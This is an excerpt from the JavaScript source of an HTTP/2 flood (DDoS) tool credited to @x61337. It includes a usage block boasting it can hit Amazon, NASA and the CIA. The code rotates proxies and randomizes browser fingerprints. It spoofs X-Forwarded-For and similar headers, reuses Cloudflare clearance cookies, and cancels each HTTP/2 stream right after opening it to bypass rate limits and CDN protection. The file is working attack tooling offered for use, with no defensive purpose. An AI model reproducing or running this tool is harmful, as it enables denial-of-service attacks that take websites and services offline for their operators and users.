...
const docss = `
All the parameters written below all work, so please pay attention. This method is a method that can be customized, almost anything can be customized, the parameter behind it using "--example" is an optional parameter, this method uses rststream to cancel each request. greetings from @x61337
...
16. --header "user-agent@kontol#referer@https://super.wow": Optional parameter to define a custom header. Example: --header "user-ganet@kontol#referer@https://super.wow".
17. --ratelimit true/false: Optional parameter to enable ratelmit mode and bypass. Example: --ratelimit true/false.
18. --randpath true/false: Optional parameter to enable random path mode. Example: --randpath true/false.
19. --randrate true/false: Optional parameter to enable random rate mode. Example: --randrate.
20. --debug true/false: Optional parameter to display errors or output from this script. Example: --debug true.
21. type Random string (%RAND% random string&int length 6) (%RANDLN% random string&int length 15) (%RANDTN% random token length 20) (%RANDL% random string length 20) (%RANDN% random int length 20) this function is only available in path. Example: https://example.com/%RAND%.
22. --cdn true/false: to bypass cdn/static like web.app firebase namecheapcdn Example: --cdn true.
23. --full can give a very big impact Can With Amazon, Namecheap, Nasa, Cia / Etc [buffer 10k]
`;

const blockedDomain = [".zip"];
...
const agentbokep = new https.Agent({
 ...
 if (enabled('precheck')) {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      console.clear();
      console.log('Attack Running! Love You @x61337');
...
let custom_table = 131072;
let custom_window = 12582912;
let custom_header = 524288;
let custom_update = 31326210;
let timer = 0;
...
function buildRequest() {
    ...
    const fwfw = ['Google Chrome', 'Brave', 'Yandex', 'Microsoft Edge', 'Opera', 'Safari', 'Firefox'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 120) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}", "Microsoft Edge";v="${browserVersion}", "Safari";v="${browserVersion}"`;
    }
    else if (browserVersion === 121) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}", "Opera";v="${browserVersion}", "Firefox";v="${browserVersion}"`;
    }
    else if (browserVersion === 122) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}", "Yandex";v="${browserVersion}", "Brave";v="${browserVersion}"`;
    }
    else if (browserVersion === 132) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}", "Brave";v="${browserVersion}", "Edge";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,application/json;q=0.9,application/javascript;q=0.9,text/css;q=0.9,text/plain;q=0.9,application/x-javascript;q=0.9,application/x-www-form-urlencoded;q=0.9,multipart/form-data;q=0.9'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,application/json;q=0.9,application/javascript;q=0.9,text/css;q=0.9,text/plain;q=0.9,application/x-javascript;q=0.9,application/x-www-form-urlencoded;q=0.9,multipart/form-data;q=0.9';

    const langValue = isBrave
        ? 'en-US,en;q=0.6,id-ID;q=0.4,fr-FR;q=0.2,de-DE;q=0.2,es-ES;q=0.2,pt-BR;q=0.2,ru-RU;q=0.2,ja-JP;q=0.2,ko-KR;q=0.2'
        : 'en-US,en;q=0.7,id-ID;q=0.3,fr-FR;q=0.2,de-DE;q=0.2,es-ES;q=0.2,pt-BR;q=0.2,ru-RU;q=0.2,ja-JP;q=0.2,ko-KR;q=0.2';
            ...
            tlsSocket = tls.connect({
                ...
                function doWrite() {
                    ...
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        ...
                        const fwfw = ['Google Chrome', 'Brave', 'Yandex', 'Microsoft Edge', 'Opera', 'Safari', 'Firefox'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site", "same-origin-allow-popups", "same-origin-allow-popups-allow-scripts", "same-origin-allow-popups-allow-scripts-allow-forms"];
                        ...
                        const langValue = isBrave
                            ? 'en-US,en;q=0.7,id-ID;q=0.3,fr-FR;q=0.2,de-DE;q=0.2,es-ES;q=0.2,pt-BR;q=0.2,ru-RU;q=0.2,ja-JP;q=0.2,ko-KR;q=0.2'
                            : 'en-US,en;q=0.8,id-ID;q=0.4,fr-FR;q=0.2,de-DE;q=0.2,es-ES;q=0.2,pt-BR;q=0.2,ru-RU;q=0.2,ja-JP;q=0.2,ko-KR;q=0.2';
                        ...
                        const headers = Object.entries({
                            ...
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0, no-cache, no-store, must-revalidate, private" }),
                        ...
                        const headers2 = Object.entries({
                            ...
                            ...(Math.random() < 0.3 && { [`x-forwarded-for${getRandomChar()}`]: `127.0.0.1${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-real-ip${getRandomChar()}`]: `127.0.0.1${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-proto${getRandomChar()}`]: `https${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-port${getRandomChar()}`]: `443${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-host${getRandomChar()}`]: `${url.hostname}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-server${getRandomChar()}`]: `${url.hostname}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-uri${getRandomChar()}`]: `${url.pathname}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-scheme${getRandomChar()}`]: `https${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-path${getRandomChar()}`]: `${url.pathname}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-query${getRandomChar()}`]: `${url.search}${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-forwarded-fragment${getRandomChar()}`]: `${url.hash}${getRandomChar()}` }),
                        }).filter(a => a[1] != null);
...
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla', 'vegas', 'westwood', 'htcp'];
    ...
    const tcpKeepaliveOptions = ['1', '0'];
    const tcpNoDelayOptions = ['1', '0'];
    const tcpMaxSynBacklogOptions = ['1024', '2048', '4096', '8192'];
    const tcpMaxTwBucketsOptions = ['180000', '360000', '720000'];
    ...
    const tcpKeepalive = tcpKeepaliveOptions[Math.floor(Math.random() * tcpKeepaliveOptions.length)];
    const tcpNoDelay = tcpNoDelayOptions[Math.floor(Math.random() * tcpNoDelayOptions.length)];
    const tcpMaxSynBacklog = tcpMaxSynBacklogOptions[Math.floor(Math.random() * tcpMaxSynBacklogOptions.length)];
    const tcpMaxTwBuckets = tcpMaxTwBucketsOptions[Math.floor(Math.random() * tcpMaxTwBucketsOptions.length)];
...
net.ipv4.tcp_keepalive_time=${tcpKeepalive} \
net.ipv4.tcp_no_metrics_save=1 \
net.ipv4.tcp_no_delay=${tcpNoDelay} \
...
setInterval(() => {
    if (timer <= 10) {
        ...
        custom_table = 131072;
        custom_window = 12582912;
        custom_header = 524288;
        custom_update = 31326210;
        timer = 0;
    }
}, 10000);
...
async function filterProxies(proxyList) {
    const validProxies = [];
    for (const proxy of proxyList) {
        if (await checkProxy(proxy)) validProxies.push(proxy);
    }
    return validProxies;
}

// Panggil sebelum serangan:
(async () => {
    proxy = await filterProxies(proxy);
})();

async function getCloudflareCookie(url) {
...
if (cfClearanceCookie) {
    headers['cookie'] = `cf_clearance=${cfClearanceCookie}`;
}
...
const extraHeaders = [
    ...
    { 'sec-ch-ua-full-version-list': '"Chromium";v="120.0.6099.110", "Not A(Brand";v="99.0.0.0"' },
    { 'sec-ch-ua-wow64': '?0' }
];

if (error.response && [403, 429, 503, 1020].includes(error.response.status)) {
    // Hapus proxy dari list
    proxy = proxy.filter(p => p !== currentProxy);
}
